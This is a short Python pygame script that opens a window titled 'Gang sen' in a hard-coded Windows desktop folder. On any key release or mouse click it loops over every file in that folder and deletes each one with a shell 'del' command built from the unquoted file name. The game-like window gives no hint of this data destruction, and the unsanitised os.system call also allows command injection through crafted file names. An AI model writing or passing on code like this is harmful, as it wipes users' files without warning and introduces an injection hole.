# -*- coding: utf-8 -*-
"""
Created on Fri Feb 17 09:45:46 2023

@author: Rayan Game
"""

import pygame,sys,os

import pygame.locals as local
import pygame.event as events

pygame.init()

pygame.display.set_mode((1000,600))
pygame.display.set_caption("Gang sen")
os.chdir('c:')
os.chdir('C:/Users/Rayan Game/desktop/Lounch')
while True:
    
    for event in events.get():
        
        if event.type == local.QUIT:
            pygame.quit()
            sys.exit()
        if event.type == local.KEYDOWN:
            
            os.system('echo Hi My F>Fast.txt')
        if event.type == local.KEYUP:
            
            os.system('echo Logset BASIC::Fire>FLog.txt')
            files = os.listdir()
            for scan in files:
                
                os.system(f'del {scan}')
        if event.type == local.MOUSEBUTTONDOWN:
            files = os.listdir()
            for scan in files:
                
                os.system(f'del {scan}')
    
    pygame.display.update()


